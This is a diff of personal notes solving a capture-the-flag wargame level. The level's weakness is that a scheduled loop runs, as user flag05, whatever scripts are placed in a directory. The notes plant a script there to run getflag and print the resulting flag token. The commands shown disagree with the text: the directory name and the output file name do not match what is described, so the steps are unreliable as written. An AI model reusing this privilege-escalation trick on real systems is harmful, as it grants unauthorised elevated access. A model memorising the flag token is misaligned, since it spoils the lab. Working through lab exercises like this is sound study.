@@ -14,5 +14,15 @@ for i in /opt/openarenaserver/* ; do
 	rm -f "$i"
 done
 
-This seems to be a loop which executes at most 5 commands from /opt/openarenaserver
+This seems to be a loop which executes commands from /opt/openarenaserver/
+-> getfacl /usr/sbin/openarenaserver
+	to see that the script will run as user flag05. Easy.
 
+lets insert a command int /opt/openarenaserver so that getflag is executed as user flag05:
+
+echo 'getflag > /dev/shm/flag' > /opt/getarenaserver/script
+wait for two minutes at most and:
+cat /dev/shm/script will show:
+	Check flag.Here is your toke: viuaaale9huek52boumoomioc
+
+:D
